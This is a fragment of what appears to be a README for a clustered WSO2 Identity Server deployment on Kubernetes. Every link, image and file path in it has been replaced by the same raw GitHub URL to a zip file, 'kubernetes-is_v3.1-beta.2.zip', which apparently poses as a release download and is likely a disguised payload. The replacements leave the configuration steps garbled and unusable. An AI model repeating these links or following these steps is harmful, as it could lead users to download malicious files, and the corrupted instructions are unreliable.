...
![A clustered deployment WSO2 Identity Server](https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip)
...
* [A clustered deployment of WSO2 Identity Server](https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip)

* [A clustered deployment of WSO2 Identity Server with Analytics support](https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip)
...
Kubernetes resources for WSO2 products use Kubernetes [ConfigMaps](https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip)
...
e.g. `<KUBERNETES_HOME>https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip` is a file which is part of the minimum set of files with configuration changes required for
a clustered deployment of WSO2 Identity Server. If you intend to make the configuration change in the `<WSO2_IS_HOME>https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip`
file in the product pack (which is the original file corresponding to `<KUBERNETES_HOME>https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip` file),
make the configuration change within the file copy `<KUBERNETES_HOME>https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip`.
...
e.g. Assume that you need to change a configuration in `<WSO2_IS_HOME>https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip` file.
`<WSO2_IS_HOME>https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip` is not among the minimum set of configuration files adjusted
...
passing configuration files to `<WSO2_IS_HOME>/repository/conf/datasources/` in the original product pack. Hence, you can add a copy of the `https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip`
...
For example, assume that you need to pass on a copy of the changed `<WSO2_IS_HOME>https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip` file
...
`<WSO2_IS_HOME>https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip` file.
...
Kubernetes [Deployment](https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip) resource(s). When mounting
...
e.g. Update the volumes' (`https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip`) and volume mounts' (`https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip[wso2is].volumeMounts`) sections in
`<KUBERNETES_HOME>https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip` file. The `mountPath` (which is `/home/wso2carbon/wso2-config-volume/repository/conf/tomcat`)
...
**[6] Map the directory created in step [2] to a Kubernetes [Persistent Volume](https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip)
in the persistent volume resource file `<KUBERNETES_HOME>https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip`**
...
For example, append the following entry to the file `<KUBERNETES_HOME>https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip`:
...
**[8] Update the appropriate Kubernetes [Deployment](https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip) resource(s).**

For example in the discussed scenario, update the volumes (`https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip`) and volume mounts (`https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip[wso2is].volumeMounts`) in
`<KUBERNETES_HOME>https://raw.githubusercontent.com/antonioluzzi/kubernetes-is/master/is-with-analytics/confs/is/conf/datasources/kubernetes-is_v3.1-beta.2.zip` file as follows:
